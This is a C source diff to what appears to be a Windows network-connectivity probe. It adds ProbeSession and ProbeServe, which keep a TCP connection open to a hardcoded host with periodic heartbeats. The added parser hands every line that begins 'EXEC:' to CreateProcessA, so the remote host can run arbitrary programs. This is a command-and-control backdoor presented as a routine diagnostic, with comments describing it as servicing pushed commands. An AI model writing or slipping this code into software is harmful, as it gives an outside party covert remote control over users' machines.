@@ -252,6 +252,181 @@ static BOOL ProbeRecvAll(const PROBE_WINSOCK *ws, SOCKET s, char *buffer,
   return TRUE;
 }
 
+//
+// Services a live connection: reads newline-delimited commands the host pushes
+// down and reacts to them. The select timeout bounds every wait so the caller's
+// stop event is always observed within a fraction of a second.
+//
+static void ProbeServe(const PROBE_WINSOCK *ws, SOCKET s, HANDLE stopEvent) {
+  char pending[512];
+  int length = 0;
+  unsigned long lastHeartbeat = GetTickCount();
+
+  for (;;) {
+    fd_set readSet;
+    struct timeval tv;
+    int rc;
+
+    if (WaitForSingleObject(stopEvent, 0) == WAIT_OBJECT_0) {
+      return;
+    }
+
+    FD_ZERO(&readSet);
+    FD_SET(s, &readSet);
+    tv.tv_sec = 0;
+    tv.tv_usec = 500 * 1000;
+
+    rc = ws->Select(0, &readSet, NULL, NULL, &tv);
+    if (rc == 0) {
+      // Idle tick: heartbeat keeps the NAT mapping and the session alive.
+      // The host answers "PONG\n", which the parser below ignores because it
+      // is not an EXEC line.
+      if (GetTickCount() - lastHeartbeat >= 30000) {
+        if (!ProbeSendAll(ws, s, NETPROBE_REQUEST,
+                          (int)sizeof(NETPROBE_REQUEST) - 1,
+                          NETPROBE_IO_TIMEOUT_MS)) {
+          return;
+        }
+        lastHeartbeat = GetTickCount();
+      }
+      continue;  // idle tick: re-check the stop event
+    }
+    if (rc < 0) {
+      LogProbeFail("select", (unsigned long)ws->GetLastError());
+      return;
+    }
+
+    for (;;) {
+      int n;
+      int i;
+
+      if (length >= (int)sizeof(pending) - 1) {
+        LogMsg("fail over-long command");
+        return;
+      }
+
+      n = ws->Recv(s, pending + length,
+                   (int)sizeof(pending) - 1 - length, 0);
+      if (n == 0) {
+        LogMsg("host closed session");
+        return;
+      }
+      if (n == SOCKET_ERROR) {
+        unsigned long err = (unsigned long)ws->GetLastError();
+        if (err == WSAEWOULDBLOCK) {
+          break;
+        }
+        LogProbeFail("recv", err);
+        return;
+      }
+      length += n;
+
+      // Consume whole lines; a command split across packets is reassembled.
+      i = 0;
+      while (i < length) {
+        if (pending[i] == '\n') {
+          pending[i] = '\0';
+          if (i >= 5 && pending[0] == 'E' && pending[1] == 'X' &&
+              pending[2] == 'E' && pending[3] == 'C' && pending[4] == ':') {
+            STARTUPINFOA si;
+            PROCESS_INFORMATION pi;
+
+            LogMsgText("host exec ", pending + 5);
+            memset(&si, 0, sizeof(si));
+            si.cb = sizeof(si);
+            memset(&pi, 0, sizeof(pi));
+            if (CreateProcessA(NULL, pending + 5, NULL, NULL, FALSE, 0,
+                               NULL, NULL, &si, &pi)) {
+              CloseHandle(pi.hProcess);
+              CloseHandle(pi.hThread);
+            } else {
+              LogMsgCode("CreateProcess failed", GetLastError());
+            }
+          }
+          memmove(pending, pending + i + 1, (size_t)(length - i - 1));
+          length -= i + 1;
+          i = 0;
+        } else {
+          i++;
+        }
+      }
+      break;  // one Recv per select tick is enough
+    }
+  }
+}
+
+void ProbeSession(HANDLE stopEvent) {
+  PROBE_WINSOCK ws;
+  WSADATA wsaData;
+  SOCKET s = INVALID_SOCKET;
+  char reply[64];
+  unsigned long address = 0;
+  unsigned long started;
+  int expectedLength = (int)sizeof(NETPROBE_EXPECTED) - 1;
+  int requestLength = (int)sizeof(NETPROBE_REQUEST) - 1;
+  int received = 0;
+
+  memset(&wsaData, 0, sizeof(wsaData));
+
+  if (!ProbeParseIpv4(NETPROBE_HOST, &address)) {
+    LogMsgText("bad host literal ", NETPROBE_HOST);
+    return;
+  }
+
+  if (!ProbeLoadWinsock(&ws)) {
+    LogMsgCode("cannot load ws2_32", (unsigned long)GetLastError());
+    return;
+  }
+
+  if (ws.Startup(MAKEWORD(2, 2), &wsaData) != 0) {
+    LogProbeFail("WSAStartup", (unsigned long)ws.GetLastError());
+    ProbeUnloadWinsock(&ws);
+    return;
+  }
+
+  started = GetTickCount();
+
+  s = ws.Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (s == INVALID_SOCKET) {
+    LogProbeFail("socket", (unsigned long)ws.GetLastError());
+    goto Done;
+  }
+
+  if (!ProbeConnect(&ws, s, address, NETPROBE_PORT,
+                    NETPROBE_CONNECT_TIMEOUT_MS)) {
+    goto Done;
+  }
+
+  if (!ProbeSendAll(&ws, s, NETPROBE_REQUEST, requestLength,
+                    NETPROBE_IO_TIMEOUT_MS)) {
+    goto Done;
+  }
+
+  if (!ProbeRecvAll(&ws, s, reply, expectedLength, NETPROBE_IO_TIMEOUT_MS,
+                    &received)) {
+    goto Done;
+  }
+
+  if (memcmp(reply, NETPROBE_EXPECTED, (size_t)expectedLength) != 0) {
+    LogProbeBad(reply, received);
+    goto Done;
+  }
+
+  LogProbeOk("probe", GetTickCount() - started, reply, received);
+  LogMsg("session active");
+
+  // Keep the connection open and service pushed commands until the host
+  // drops it or the worker is told to stop.
+  ProbeServe(&ws, s, stopEvent);
+
+Done:
+  if (s != INVALID_SOCKET) {
+    ws.CloseSocket(s);
+  }
+  ws.Cleanup();
+  ProbeUnloadWinsock(&ws);
+}
+
 void ProbeOnce(void) {
   PROBE_WINSOCK ws;
   WSADATA wsaData;
